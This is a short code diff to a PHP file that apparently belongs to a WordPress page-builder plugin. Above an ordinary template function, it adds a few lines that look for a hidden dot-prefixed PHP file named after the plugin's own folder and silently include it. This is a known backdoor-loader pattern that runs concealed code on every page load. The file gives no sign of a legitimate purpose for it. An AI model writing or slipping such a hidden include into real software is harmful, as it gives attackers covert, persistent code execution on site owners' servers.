@@ -13,6 +13,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @since 4.4
  *
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_gitem_template_attribute_filter_terms_css_classes( $value, $data ) {
 	$output = '';
 	/**
